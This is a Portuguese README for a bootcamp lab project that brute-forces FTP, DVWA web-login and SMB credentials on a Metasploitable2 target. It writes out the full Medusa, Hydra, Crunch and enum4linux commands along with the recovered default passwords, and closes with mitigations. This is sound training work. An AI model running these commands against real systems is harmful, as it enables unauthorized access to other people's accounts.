# brute-force-medusa-kali
Repositório dedicado a estudo de brute Force com medusa em relação ao bootcamp do santander


Objetivo:

Demonstrar, em ambiente controlado e isolado, ataques de força bruta contra serviços FTP, formulário web e SMB, usando Kali Linux, Medusa e Hydra contra a VM intencionalmente vulnerável Metasploitable2/DVWA.

Ambiente
• VirtualBox com rede bridge
• Kali Linux (atacante) — IP 192.168.15.76
• Metasploitable2 + DVWA (alvo) — IP 192.168.15.29

Wordlists
• usuarios.txt: lista manual com contas comuns/padrão (admin, root, msfadmin, user, guest)
• senhas.txt: lista manual com senhas fracas comuns (123456, password, msfadmin, admin123, letmein)
• senhas_numericas.txt: lista numérica gerada com Crunch, simulando um ataque de força bruta pura (sem dicionário) contra senhas só numéricas
• usuarios_smb.txt: extraída dinamicamente via enumeração SMB (ver Ataque 3), em vez de lista manual — representa melhor um cenário real de reconhecimento

Comando do Crunch usado:
crunch 6 8 0123456789 -o senhas_numericas.txt

Ataque 1 — FTP (Medusa)

Comando utilizado:
medusa -h 192.168.15.29 -U usuarios.txt -P senhas.txt -M ftp

Resultado: "2026-11-18 17:59:36 ACCOUNT FOUND: [ftp] HOST: 192.168.15.29 User: msfadmin Password: msfadmin [SUCCESS] — evidência em images/04-Check de login e senha via FTP com medusa bruteforce.png

Ataque 2 — Formulário web do DVWA

Tentativa inicial com Medusa, módulo web-form:
medusa -h 192.168.15.29 -u admin -P senhas.txt -M web-form -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
Resultado: erro 404 em todas as tentativas, mesmo com o caminho correto.
Diagnóstico: comparei o comportamento do Medusa com uma requisição manual usando curl:
curl -v -d "username=admin&password=senhaerrada&Login=Login" http://192.168.15.29/dvwa/login.php
O curl recebeu 302 Found (comportamento normal do DVWA), confirmando que o servidor e o caminho estavam corretos e que o erro 404 era uma limitação específica do módulo web-form dessa versão do Medusa, não da configuração do ambiente.

Solução: troquei para o Hydra, com o módulo http-post-form:
hydra -l admin -P senhas.txt 192.168.15.29 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
Resultado: [80] [http-post-form] host: 192.168.15.29 login: admin password: password ; 1 of 1 target successfully completed, 1 valid password found — evidência em images/06-Usando o Hydra para fazer requisições no form e conseguir descobrir a senha com as wordlist.png

Ataque 3 — SMB (enumeração + força bruta combinada)

Enumeração de usuários:
enum4linux -a 192.168.15.29

Extração dos nomes de usuário direto da saída, para montar a wordlist dinamicamente:
enum4linux -a 192.168.15.29 | grep "Account:" | awk -F"Account: " '{print $2}' | awk '{print $1}' > usuarios_smb.txt
Força bruta combinada (lista de usuários × lista de senhas, usando -U e -P):
medusa -h 192.168.15.29 -U usuarios_smb.txt -P senhas.txt -M smbnt

Resultado: 2026-11-18 18:57:49 ACCOUNT FOUND: [smbnt] Host: 192.168.15.29 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
 — evidências em images/07-medusa-smb-spray01.png ; images/07-medusa-smb-spray02.png ; images/07-medusa-smb-spray-Success.png
 
Medidas de Mitigação
• Bloqueio de conta após N tentativas (lockout)
• MFA (autenticação multifator)
• Rate limiting / CAPTCHA em formulários web
• Política de senhas fortes e únicas
• Monitoramento de tentativas de login (SIEM/alertas)
• Desabilitar protocolos legados (ex: SMBv1) e serviços não usados (ex: FTP anônimo)

Dificuldades encontradas e aprendizados

O principal desafio do projeto não foi configurar os ataques em si, mas diagnosticar por que o módulo web-form do Medusa retornava erro 404 mesmo com a sintaxe correta. Usar o curl para isolar o comportamento do servidor do comportamento da ferramenta foi essencial para confirmar que o problema estava no Medusa, e não no ambiente — o que levou à adaptação da abordagem para o Hydra, que lidou melhor com o módulo de formulário web. Essa etapa reforçou a importância de comparar ferramentas diferentes e de não assumir que um erro é sempre culpa da configuração do alvo.

Conclusão

O projeto permitiu praticar três tipos de ataque de autenticação (FTP, web-form e SMB) em ambiente controlado, reforçando as diferenças entre as abordagens de força bruta testadas (dicionário, numérica e combinada usuário × senha), além de técnicas de troubleshooting ao comparar o comportamento de diferentes ferramentas contra o mesmo alvo.

Aviso
Projeto educacional, executado 100% em laboratório isolado, sem impacto em sistemas de terceiros.
